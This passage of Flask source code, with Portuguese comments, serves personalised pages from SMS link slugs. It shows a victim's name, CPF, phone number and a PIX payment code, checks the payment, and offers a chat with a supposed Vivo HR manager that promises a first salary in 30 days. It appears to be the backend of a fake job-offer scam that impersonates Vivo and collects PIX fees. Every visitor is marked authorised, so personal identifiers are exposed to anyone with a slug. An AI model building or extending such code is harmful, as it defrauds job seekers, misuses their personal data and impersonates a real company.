@app.route('/vaga/<slug>')
def vaga_slug(slug):
    """Rota para recuperação de vendas com dados específicos do usuário via slug do SMS"""
    # Sempre autorizar acesso a esta página para fins de recuperação de vendas
    session['authorized'] = True
    
    try:
        # Buscar dados no banco de dados PostgreSQL pela slug
        recovery_data = RecoveryData.get_by_slug(slug)
        
        if recovery_data:
            # Marcar como acessado no banco de dados
            recovery_data.mark_accessed()
            
            # Extrair dados do banco
            nome = recovery_data.nome
            cpf = recovery_data.cpf
            telefone = recovery_data.telefone
            cidade = recovery_data.cidade
            transaction_id = recovery_data.transaction_id
            pix_code = recovery_data.pix_code
            
            # Salvar dados na sessão para uso posterior
            session['user_data'] = {
                'nome': nome,
                'cpf': cpf,
                'telefone': telefone,
                'cidade': cidade
            }
            session['transaction_id'] = transaction_id
            
            app.logger.info(f"Recuperação de vendas ativada para {nome} via slug {slug}")
            
            # Extrair primeiro nome para personalização
            primeiro_nome = nome.split()[0] if nome else 'Candidato'
            
            return render_template('vaga.html',
                                  nome=nome,
                                  primeiro_nome=primeiro_nome,
                                  cpf=cpf,
                                  telefone=telefone,
                                  cidade=cidade,
                                  slug=slug,
                                  transaction_id=transaction_id,
                                  pix_code=pix_code)
        else:
            # Se não encontrar dados para a slug, usar valores padrão
            app.logger.warning(f"Dados não encontrados para slug: {slug}")
            return render_template('vaga.html',
                                  nome='Candidato',
                                  cpf='',
                                  telefone='',
                                  cidade='São Paulo',
                                  slug=slug)
                                  
    except Exception as e:
        app.logger.error(f"Erro ao recuperar dados para slug {slug}: {str(e)}")
        # Em caso de erro, usar valores padrão
        return render_template('vaga.html',
                              nome='Candidato',
                              cpf='',
                              telefone='',
                              cidade='São Paulo',
                              slug=slug)

@app.route('/check_payment_status/<transaction_id>')
def check_payment_status(transaction_id):
    """
    Endpoint para verificar o status de uma transação PIX
    Retorna JSON com o status atual
    """
    try:
        # Inicializar a API
        payment_api = create_payment_api()
        
        # Verificar o status do pagamento
        status_result = payment_api.check_payment_status(transaction_id)
        
        # Verificar se o pagamento foi aprovado
        payment_status = status_result.get('status', '')
        app.logger.info(f"Status retornado pela API: {payment_status}")
        
        # Verificar se é APPROVED ou completed (ambos indicam aprovação)
        if payment_status == 'completed':
            # Registrar o sucesso no pagamento
            app.logger.info(f"Pagamento {transaction_id} APROVADO")
            
            # Incluir o transaction_id no redirecionamento para capturar na página de sucesso
            return jsonify({
                'status': 'approved', 
                'redirect': url_for('treinamento', transaction_id=transaction_id)
            })
        else:
            app.logger.info(f"Pagamento {transaction_id} em processamento: {payment_status}")
            return jsonify({'status': 'pending'})
            
    except Exception as e:
        app.logger.error(f"Erro ao verificar status do pagamento: {str(e)}")
        return jsonify({'status': 'pending'})

@app.route('/chat')
def chat():
    """Rota para a página de chat com gerente de RH da Vivo"""
    # Buscar dados do usuário da sessão
    user_data = session.get('user_data', {})
    nome = user_data.get('nome', 'Candidato')
    cidade = user_data.get('cidade', 'São Paulo') 
    cpf = user_data.get('cpf', '')
    
    # Calcular data do primeiro salário (30 dias após o cadastro)
    from datetime import datetime, timedelta
    now = datetime.now()
    data_primeiro_salario = now + timedelta(days=30)
    data_primeiro_salario_formatada = data_primeiro_salario.strftime('%d/%m/%Y')
    
    return render_template('chat.html',
                         nome=nome,
                         cidade=cidade,
                         cpf=cpf,
                         data_primeiro_salario=data_primeiro_salario_formatada)

# Inicializar tabelas do banco de dados
with app.app_context():
    db.create_all()

if __name__ == "__main__":
    # Use a variável PORT fornecida pelo Heroku, ou 5000 como padrão
    port = int(os.environ.get("PORT", 5001))
    app.run(host="0.0.0.0", port=port, debug=False)
